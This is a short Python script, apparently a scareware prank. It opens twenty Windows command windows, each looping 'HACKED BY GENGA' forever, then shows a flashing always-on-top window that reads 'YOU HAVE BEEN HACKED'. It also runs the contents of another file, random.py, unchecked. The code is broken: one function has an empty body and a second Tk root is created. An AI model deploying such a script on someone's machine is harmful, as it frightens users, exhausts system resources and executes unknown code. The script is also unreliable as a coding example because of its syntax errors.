import os
import time
import tkinter as tk


for i in range(20):
    os.system('start "" cmd /k "color 02 && :loop && echo HACKED BY GENGA && goto loop"')
root = tk.Tk()
root.title("Terminal Simulation")
root.geometry("600x400")



def update_text():
    

update_text()

   

root = tk.Tk()
root.title("HACKED")
root.geometry("1000x500")  
root.attributes("-topmost", True)
root.lift()

label = tk.Label(
    root,
    text="YOU HAVE BEEN HACKED",
    font=("Arial", 48, "bold"),
    fg="black"
)
label.pack(expand=True, fill="both")

colors = ["red", "green"]
index = 0

def blink():
    global index
    color = colors[index]
    root.configure(bg=color)
    label.configure(bg=color)
    index = 1 - index
    root.after(150, blink)  # Alle 150 ms wechseln

blink()

# HIER: Andere Datei als LETZTES ausführen (vor mainloop)
exec(open("random.py").read())

root.mainloop() 